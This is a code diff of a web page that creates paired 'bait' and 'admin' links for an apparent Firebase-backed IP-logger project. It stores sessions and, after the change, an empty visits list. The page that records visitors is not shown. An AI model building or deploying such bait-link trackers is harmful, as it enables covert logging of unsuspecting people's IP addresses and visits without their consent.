@@ -14,9 +14,7 @@
   <p id="admin"></p>
 
   <script type="module">
-    // ✅ Import from Firebase CDN instead of "firebase/app"
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-    import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-analytics.js";
     import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
     // ✅ Your Firebase config
@@ -24,41 +22,33 @@
       apiKey: "AIzaSyDB_KZ3PvzhxS2rW_MNoUle0quTS254plo",
       authDomain: "ip-logger-hopefully-theone.firebaseapp.com",
       projectId: "ip-logger-hopefully-theone",
-      storageBucket: "ip-logger-hopefully-theone.appspot.com", // ✅ fixed .app → .appspot.com
+      storageBucket: "ip-logger-hopefully-theone.appspot.com",
       messagingSenderId: "162611845621",
       appId: "1:162611845621:web:7b2f3280c58fc2043e28bc",
       measurementId: "G-VQX9171CF5"
     };
 
-    // ✅ Initialize Firebase
     const app = initializeApp(firebaseConfig);
-    const analytics = getAnalytics(app);
     const db = getFirestore(app);
 
-    // Helper: random string generator
     function randomString(length) {
       const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
       return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
     }
 
-    // Create new bait/admin link pair
     async function makeNew() {
       const sessionId = randomString(8);
       const code = randomString(6);
 
-      // Save session in Firestore
-      await setDoc(doc(db, "links", sessionId), { code: code });
+      await setDoc(doc(db, "links", sessionId), { code: code, visits: [] });
 
-      // Build links
       const baitLink = window.location.origin + "/user.html?id=" + sessionId;
       const adminLink = window.location.origin + "/admin.html?id=" + sessionId + "&code=" + code;
 
-      // Display links
       document.getElementById("bait").innerHTML = `<a href="${baitLink}" target="_blank">${baitLink}</a>`;
       document.getElementById("admin").innerHTML = `<a href="${adminLink}" target="_blank">${adminLink}</a>`;
     }
 
-    // Connect button
     document.getElementById("makeBtn").addEventListener("click", makeNew);
   </script>
 </body>
